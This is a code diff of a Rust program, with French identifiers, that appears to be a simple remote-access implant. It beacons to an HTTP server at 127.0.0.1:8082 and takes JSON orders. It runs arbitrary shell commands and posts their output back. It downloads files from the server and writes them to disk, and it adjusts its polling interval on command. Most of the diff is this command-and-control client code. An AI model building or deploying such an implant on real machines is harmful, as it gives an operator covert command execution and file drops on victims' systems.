@@ -1,12 +1,29 @@
 use std::{
-    io::{prelude::*, Result, Write},
-    net::{TcpStream},
+    io::{Result, Cursor},
     thread,
     time::Duration,
     process::{Command, Output},
     str
 };
 use reqwest;
+use serde::{Serialize, Deserialize};
+use bytes::Bytes;
+
+
+#[derive(Serialize, Deserialize, Debug)]
+enum OrdreType {
+    Commande,
+    Fichier,
+    Vitesse,
+    Autre
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+struct Ordre {
+    ordre: OrdreType,
+    arguments: Vec<String>,
+}
+
 
 //Exemple utilisation de la commande
 // let vecteur = vec!["-a".to_string(), "-l".to_string()];
@@ -23,13 +40,116 @@ fn exec_commande_shell(command : String, args : Vec<String>) -> std::io::Result<
 }
 
 #[tokio::main]
-async fn sending_request_with_result(mut result_command : String) -> std::io::Result<()> {
+async fn sending_request(t : u64) -> Option<u64>{
+    let client = reqwest::Client::builder()
+    .build().unwrap();
+    let response = client.get("http://127.0.0.1:8082")
+    .body(String::from("Waiting for instructions"))
+    .send()
+    .await;
+    match response{
+        Ok(v) => {
+            match v.status() {
+                reqwest::StatusCode::OK => {
+                    println!("Success!");
+
+                    let texte : String = v.text().await.unwrap();
+                    let contenu : std::result::Result<Ordre, serde_json::Error> = serde_json::from_str(&texte);
+
+                    match contenu {
+                       Ok(v) => {
+
+                            match v.ordre {
+                                OrdreType::Commande => {
+                                    let command_args = v.arguments[1..].to_vec();
+                                    let command_name = v.arguments.get(0).unwrap().clone();
+
+                                    let result_command = exec_commande_shell(command_name, command_args);
+
+                                    match result_command{
+                                        Ok(mut v) => sending_request_with_result(v.output().expect("error")).await.unwrap(),
+                                        Err(_) => println!("erreur")
+                                    };
+                                },
+                                OrdreType::Fichier => {
+                                    let filename = v.arguments[0].clone();
+                                    let mut file = std::fs::File::create(filename).unwrap();
+                                    
+                                    let content = send_file_post_request().await;
+                                    match content {
+                                        Ok(v) => {
+                                            let mut content = Cursor::new(v);
+                                            std::io::copy(&mut content, &mut file).unwrap();
+                                        },
+                                        Err(_) => {
+                                            panic!("Cannot receive file content !")
+                                        }
+                                    }
+                                },
+                                OrdreType::Vitesse => {
+                                    let new_vitesse = v.arguments[0].parse::<u64>().unwrap();
+                                    return Some(new_vitesse);
+                                },
+                                _ => {
+                                    println!("Ordre non implémenté");
+                                }
+                            }
+
+                       },
+                       Err(_) => {
+                            println!("Erreur de lecture de l'ordre");
+                       }
+                    }
+
+                },
+                reqwest::StatusCode::REQUEST_TIMEOUT => {
+                    println!("Request Timeout");
+                },
+                e => {
+                    panic!("Uh oh! Something unexpected happened.   :   {:?}", e);
+                }
+            };
+        },
+        Err(_err) => println!("Pas de Connexion")
+    };
+
+    thread::sleep(Duration::from_millis(t));
+    return None;
+}
+
+
+
+async fn send_file_post_request() -> std::result::Result<Bytes, reqwest::Error> {
+
     let client = reqwest::Client::new();
-    result_command = result_command.replace("\n", "n");
-    result_command = result_command.replace("\r", "r");
-    result_command.push_str("EOF");
+    let response = client.post("http://127.0.0.1:8082")
+    .send()
+    .await;
+
+    match response{
+        Ok(v) => {
+            match v.status() {
+                reqwest::StatusCode::OK => {
+                    println!("file : Success!");
+
+                    let bytes = v.bytes().await.unwrap();
+                    return Ok(bytes);
+
+                },
+                _ => {
+                    panic!("Uh oh! Something unexpected happened.");
+                }
+            };
+        },
+        Err(e) => return Err(e)
+    };
+}
+
+
+async fn sending_request_with_result(result_command : Output) -> Result<()> {
+    let client = reqwest::Client::new();
     let response = client.post("http://127.0.0.1:8082/")
-    .body(result_command) 
+    .body(String::from_utf8(result_command.stdout).unwrap()) 
     .send()
     .await;
     match response{
@@ -52,59 +172,14 @@ async fn sending_request_with_result(mut result_command : String) -> std::io::Re
     return Ok(());
 }
 
-
-#[tokio::main]
-async fn sending_request(t: u64) -> Result<()> {
-
-    let client = reqwest::Client::new();
-    client.get("http://0.0.0.0:8082/")
-        .send()
-        .await
-        .expect("failed to get response")
-        .text()
-        .await
-        .expect("failed to get payload");
-
-    println!("{:?}", client);
-    println!("toto");
-    thread::sleep(Duration::from_millis(t));
-
-    let mut stream = TcpStream::connect("127.0.0.1:7878")?;
-    stream.write(&[1])?;
-    stream.read(&mut [0; 128])?;
-    return Ok(());
-}
-
-
 fn main() {
     let boucle : bool = true;
-    let delay_in_sec: f64 = 5.0; 
+    let mut delay_in_sec: f64 = 5.0; 
     while boucle {
         let result = sending_request((delay_in_sec*(1000 as f64)) as u64);
         match result {
-            Ok(_) =>  {()},
-            _ => {println!("An error occured sending the request")}
+            Some (new_time) =>  {delay_in_sec = new_time as f64},
+            None => {}
         }
     }
-    let vecteur = vec!["-a".to_string(), "-l".to_string()];
-    let result_command = exec_commande_shell(String::from("ls"), vecteur);
-    match result_command{
-        Ok(mut v) => {
-            let mut string_result = String::from("");
-            for line in v.output() {
-                string_result.push_str(str::from_utf8(&line.stdout).unwrap());
-            }
-            match sending_request_with_result(String::from(string_result.trim())){
-                Ok(_) => {
-                    println!("Request sent successfully");
-                },
-                Err(_) => {
-                    println!("Error : Request not sent");
-                },
-            }
-        },
-        _ => {
-            println!("An error occured executing host command line");
-        }
-    };
 }
